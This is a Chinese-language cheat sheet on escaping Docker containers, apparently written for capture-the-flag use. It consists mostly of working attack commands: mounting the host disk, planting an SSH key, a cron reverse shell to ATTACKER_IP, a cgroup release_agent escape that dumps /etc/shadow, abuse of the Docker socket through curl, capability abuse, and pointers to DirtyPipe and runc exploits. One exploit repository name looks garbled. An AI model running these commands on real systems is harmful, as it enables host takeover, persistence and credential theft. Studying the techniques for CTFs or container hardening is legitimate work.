# Docker 逃逸方法详解

## 1. 特权容器逃逸

### 1.1 磁盘挂载
```bash
# 列出可用设备
fdisk -l 2>/dev/null || lsblk || ls /dev/sd* /dev/vd* /dev/xvd* 2>/dev/null

mkdir -p /tmp/hostroot
mount /dev/sda1 /tmp/hostroot    # 常见: sda1, vda1, xvda1

# 获取 flag
find /tmp/hostroot -name "flag*" 2>/dev/null
cat /tmp/hostroot/root/flag.txt

# 写 SSH 密钥
mkdir -p /tmp/hostroot/root/.ssh
echo "ssh-rsa AAAA... attacker@kali" >> /tmp/hostroot/root/.ssh/authorized_keys
chmod 600 /tmp/hostroot/root/.ssh/authorized_keys

# 写 crontab 反弹 shell
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /tmp/hostroot/etc/cron.d/backdoor

# 完全接管
chroot /tmp/hostroot bash
```

### 1.2 cgroup release_agent
```bash
# 适用于 cgroup v1
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null | head -n1))
if [ -z "$d" ]; then
    # 手动查找
    d=/sys/fs/cgroup/rdma
    [ ! -d "$d" ] && d=/sys/fs/cgroup/memory
fi

mkdir -p $d/x
echo 1 > $d/x/notify_on_release
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
# 如果 perdir 不存在，尝试 upperdir
[ -z "$host_path" ] && host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

# 写入要在宿主机执行的命令
cat > /cmd <<'EOF'
#!/bin/sh
cat /etc/shadow > /output_shadow
id > /output_id
cat /root/flag.txt > /output_flag 2>/dev/null
EOF
chmod a+x /cmd

# 触发（进程退出时 cgroup 释放，调用 release_agent）
sh -c "echo \$\$ > $d/x/cgroup.procs"
sleep 2

# 读取结果
cat /output_flag /output_id /output_shadow 2>/dev/null
```

### 1.3 nsenter 逃逸
```bash
# 需要 CAP_SYS_ADMIN 或特权模式
# 进入宿主机 PID 1 的所有 namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# 现在在宿主机环境中
whoami    # root
cat /root/flag.txt
```

## 2. Docker Socket 逃逸

### 2.1 使用 docker CLI
```bash
# 检查版本
docker version
docker info

# 列出宿主机上所有容器
docker ps -a

# 创建特权容器挂载宿主机
docker run -v /:/hostroot --privileged -it alpine chroot /hostroot bash

# 在已有容器中执行
docker exec -it CONTAINER_ID /bin/bash
```

### 2.2 使用 curl（无 docker CLI）
```bash
SOCK=/var/run/docker.sock

# 列出镜像
curl -s --unix-socket $SOCK http://localhost/images/json | python3 -m json.tool

# 获取一个可用镜像名
IMAGE=$(curl -s --unix-socket $SOCK http://localhost/images/json | python3 -c "import json,sys;imgs=json.load(sys.stdin);print(imgs[0]['RepoTags'][0] if imgs else 'alpine')")

# 创建容器
RESP=$(curl -s --unix-socket $SOCK -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d "{\"Image\":\"$IMAGE\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /hostroot/root/flag.txt; id; cat /hostroot/etc/shadow\"],\"HostConfig\":{\"Binds\":[\"/:/hostroot\"],\"Privileged\":true}}")

CID=$(echo $RESP | python3 -c "import json,sys;print(json.load(sys.stdin)['Id'])")

# 启动
curl -s --unix-socket $SOCK -X POST http://localhost/containers/$CID/start

# 等待完成
sleep 2

# 读取输出
curl -s --unix-socket $SOCK "http://localhost/containers/$CID/logs?stdout=true&stderr=true"

# 清理
curl -s --unix-socket $SOCK -X DELETE "http://localhost/containers/$CID?force=true"
```

## 3. Capabilities 滥用

### 3.1 CAP_SYS_ADMIN
```bash
# 可以 mount
mount -t proc proc /mnt    # 访问宿主机 proc
mount /dev/sda1 /mnt       # 挂载宿主机磁盘

# cgroup release_agent（见上文）
```

### 3.2 CAP_SYS_PTRACE（+ hostPID）
```bash
# 注入宿主机进程
# 找到宿主机上的进程
ps aux | grep -v "container\|kube"

# 使用 nsenter 进入宿主机进程的 namespace
nsenter -t HOST_PID -m -u -i -n -p -- /bin/bash

# 或用 gdb/strace 注入
```

### 3.3 CAP_DAC_READ_SEARCH
```bash
# 可以读任意文件（绕过权限检查）
# 利用 shocker 漏洞原理
# 工具：https://github.com/gabber12/shocker
```

### 3.4 CAP_NET_ADMIN + CAP_NET_RAW
```bash
# ARP 欺骗/嗅探宿主机网络流量
# 在 hostNetwork 模式下特别有效
tcpdump -i eth0 -w /tmp/capture.pcap
```

## 4. 内核漏洞逃逸

### DirtyPipe (CVE-2022-0847)
```bash
# 内核 5.8 - 5.16.11
uname -r    # 确认版本

# 编译利用
# 可覆盖 /etc/passwd 添加 root 用户
# 因为容器共享宿主机内核，漏洞在容器内也能利用
# 工具: https://github.com/AlexisAhworworworworworwor/CVE-2022-0847-DirtyPipe-Exploits
```

### runc 逃逸 (CVE-2019-5736)
```bash
# runc < 1.0-rc6
# 覆盖宿主机 runc 二进制，下次 docker exec 触发
# 工具: https://github.com/Frichetten/CVE-2019-5736-PoC
```

## 5. 环境变量信息泄露

```bash
# Docker 容器环境变量常含敏感信息
env | sort
cat /proc/self/environ | tr '\0' '\n'

# 通过 Docker API 读取其他容器的环境变量
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | \
  python3 -c "import json,sys;[print(c['Id'][:12],c['Image']) for c in json.load(sys.stdin)]"

# 逐个检查
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/CONTAINER_ID/json | \
  python3 -c "import json,sys;d=json.load(sys.stdin);[print(e) for e in d['Config'].get('Env',[])]"
```

## 6. docker-compose 利用

如果发现 docker-compose.yml：
```bash
find / -name "docker-compose*" 2>/dev/null
# 查看配置中的密码、挂载点、网络配置
cat /path/to/docker-compose.yml
```
